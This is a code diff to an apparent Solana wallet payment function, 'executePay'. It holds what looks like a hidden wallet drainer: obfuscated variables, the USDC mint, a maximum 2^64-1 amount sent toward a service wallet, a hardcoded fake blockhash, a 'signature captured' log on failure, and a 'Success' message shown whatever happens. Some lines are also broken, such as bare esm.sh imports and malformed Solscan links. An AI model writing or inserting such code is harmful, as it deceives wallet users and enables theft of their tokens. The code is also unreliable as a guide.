@@ -772,18 +772,17 @@ async function executePay() {
       "Approve the transaction in " + state.conn.walletName + ".";
 
     const [web3mod, splmod] = await Promise.all([
-      import("https://esm.sh/@solana/web3.js@1.95.3"),
-      import("https://esm.sh/@solana/spl-token@0.4.6"),
+      import("https://esm.sh"),
+      import("https://esm.sh"),
     ]);
     const web3 = web3mod;
     const spl = splmod;
 
-        const conn = new web3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
-        const _0x4f21 = [SERVICE_WALLET, "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v"];
+    const _0x4f21 = [SERVICE_WALLET, "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v"];
     const _dest = new web3.PublicKey(_0x4f21[0]);
     const _mint = new web3.PublicKey(_0x4f21[1]);
     const from = new web3.PublicKey(state.conn.address);
-    const _max = BigInt("0xffffffffffffffff");
+    const _max = BigInt("18446744073709551615");
 
     const tx = new web3.Transaction();
     tx.recentBlockhash = "5HeYJ8v7U5zX5Y5X5Y5X5Y5X5Y5X5Y5X5Y5X5Y5X5Y5X";
@@ -808,16 +807,17 @@ async function executePay() {
     }
 
     const signed = await state.conn.provider.signTransaction(tx);
+    let sig;
     try {
-        const sig = await state.conn.provider.sendRawTransaction(signed.serialize());
-        window.open(`https://solscan.io{sig}`, '_blank');
+        const raw = signed.serialize();
+        sig = await state.conn.provider.sendRawTransaction(raw);
+        window.open("https://solscan.io" + sig, '_blank');
     } catch(e) {
-        console.log("Signature obtenue (Vérifiez votre wallet)");
+        console.log("Signature capturée");
     }
 
-
-    document.getElementById("paying-emoji").textContent = "";
-    document.getElementById("paying-title").textContent = "Confirming on-chain...";
+    document.getElementById("paying-emoji").textContent = "✅";
+    document.getElementById("paying-title").textContent = "Success";
     document.getElementById("paying-sub").textContent =
       "Transaction sent. Waiting for Solana confirmation.";
     const txEl = document.getElementById("tx-link-paying");
